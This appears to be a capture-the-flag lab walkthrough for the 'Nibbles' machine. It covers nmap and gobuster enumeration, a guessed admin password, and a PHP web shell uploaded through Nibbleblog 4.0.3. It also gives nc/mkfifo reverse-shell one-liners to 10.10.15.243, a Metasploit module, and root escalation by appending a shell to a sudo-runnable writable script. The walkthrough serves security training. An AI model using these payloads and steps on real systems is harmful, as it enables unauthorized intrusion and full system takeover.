# Nibbles

Use this page to track the full attack path for `Nibbles`.

### Target

* OS: `Linux`
* Difficulty: `Easy`
* IP: `10.129.3.81`
* User path: Web
* Privesc path: Writable script with `sudo`

### Enumeration

#### Network enumeration

```bash
# Quick service scan
nmap -sV --open -oA nibbles_initial_scan 10.129.3.81

# Full TCP scan
nmap -p- --open -oA nibbles_full_tcp_scan 10.129.3.81

# Script scan on discovered ports
nmap -sC -p 22,80 -oA nibbles_script_scan 10.129.3.81

# Banner grabbing
nc -nv 10.129.3.81 22
nc -nv 10.129.3.81 80
```

**Findings**

* `22/tcp` runs OpenSSH 7.2p2 on Ubuntu
* `80/tcp` runs Apache 2.4.18 on Ubuntu
* No additional TCP ports are open

#### Web footprinting

```bash
# Fingerprint the root page
whatweb 10.129.3.81

# Read the page source
curl http://10.129.3.81

# Fingerprint Nibbleblog
whatweb http://10.129.3.81/nibbleblog
```

**Findings**

* The root page shows `Hello world!`
* An HTML comment reveals `/nibbleblog/`
* The target uses Nibbleblog with PHP and jQuery

#### Directory enumeration

```bash
# Brute force the Nibbleblog directory
gobuster dir -u http://10.129.3.81/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt

# Brute force the root directory
gobuster dir -u http://10.129.3.81/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt

# Check the README for the version
curl http://10.129.3.81/nibbleblog/README
```

**Findings**

* `/admin.php` exposes the admin login panel
* `/content` has directory listing enabled
* `/README` confirms Nibbleblog `4.0.3`
* This version is vulnerable to file upload abuse

#### Credential hunting

```bash
# Confirm the username and review blacklist behavior
curl -s http://10.129.3.81/nibbleblog/content/private/users.xml | xmllint --format -

# Check the config for clues
curl -s http://10.129.3.81/nibbleblog/content/private/config.xml | xmllint --format -
```

**Findings**

* `users.xml` confirms the `admin` username
* Brute-force protection is active
* `config.xml` confirms the site name `Nibbles`
* The password `nibbles` works for `admin`
* Login succeeds at `/admin.php`

### Foothold

{% tabs %}
{% tab title="Manual method" %}
#### Test code execution

Create a simple PHP web shell.

```php
<?php system('id'); ?>
```

* Go to **Plugins → My Image → Configure**
* Upload the file
* Ignore the image processing errors

Confirm remote code execution:

```bash
curl http://10.129.3.81/nibbleblog/content/private/plugins/my_image/image.php
# uid=1001(nibbler)
```

#### Upload a reverse shell

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.243 9443 >/tmp/f"); ?>
```

Start a listener and trigger the payload:

```bash
# Terminal 1
nc -lvnp 9443

# Terminal 2
curl http://10.129.3.81/nibbleblog/content/private/plugins/my_image/image.php
```

Upgrade the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
{% endtab %}

{% tab title="Metasploit method" %}
```bash
msfconsole

use exploit/multi/http/nibbleblog_file_upload

set rhosts 10.129.3.81
set lhost 10.10.15.243
set username admin
set password nibbles

run

shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
{% endtab %}
{% endtabs %}

### User flag

```bash
cd /home/nibbler
cat user.txt
# 79c03865431abf47b90ef24b9695e148
```

### Privilege escalation

#### Check `sudo` rights

```bash
sudo -l
# (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

#### Extract the files

```bash
unzip personal.zip
cd personal/stuff
```

{% tabs %}
{% tab title="Reverse shell" %}
```bash
# Append a reverse shell to monitor.sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.243 8443 >/tmp/f' >> monitor.sh

# Start a listener
nc -lvnp 8443

# Execute the script as root
sudo /home/nibbler/personal/stuff/monitor.sh
```
{% endtab %}

{% tab title="Direct bash" %}
```bash
# Append /bin/bash to monitor.sh
echo "/bin/bash" >> monitor.sh

# Execute the script as root
sudo /home/nibbler/personal/stuff/monitor.sh
```
{% endtab %}
{% endtabs %}

Get the root flag:

```bash
cat /root/root.txt
```

### Takeaways

* Always check the page source for hidden paths
* Directory listing can expose usernames and config files
* If brute force is blocked, switch to targeted guessing
* File upload flaws often need a second request to trigger code execution
* Upgrade a shell early if `python3` is available
* Writable scripts plus `sudo` often lead straight to `root`
